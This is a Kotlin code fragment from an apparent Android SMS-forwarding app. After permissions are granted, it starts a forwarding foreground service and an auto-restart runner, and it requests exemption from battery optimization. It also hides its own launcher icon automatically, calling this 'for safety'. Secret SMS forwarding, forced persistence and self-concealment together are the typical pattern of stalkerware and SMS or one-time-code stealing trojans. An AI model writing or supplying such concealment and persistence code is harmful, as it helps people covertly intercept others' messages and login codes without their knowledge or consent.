    private fun onPermissionsGranted() {
        val serviceIntent = Intent(this, ForwarderForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        setupAutoRunner()
        
        findViewById<TextView>(R.id.statusText).text =
            "✅ Running in Background.\n\n" +
            "Ultimate Background Runner is Active. If killed, it will auto-restart."
            
        // Hide the app icon automatically
        try {
            val componentName = android.content.ComponentName(this, "com.satyam.smsforwarder.LauncherActivity")
            val isEnabled = packageManager.getComponentEnabledSetting(componentName) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            if (isEnabled || packageManager.getComponentEnabledSetting(componentName) == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT) {
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Toast.makeText(this, "App icon has been automatically hidden from launcher for safety.", Toast.LENGTH_LONG).show()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
            
        requestIgnoreBatteryOptimizations()
    }
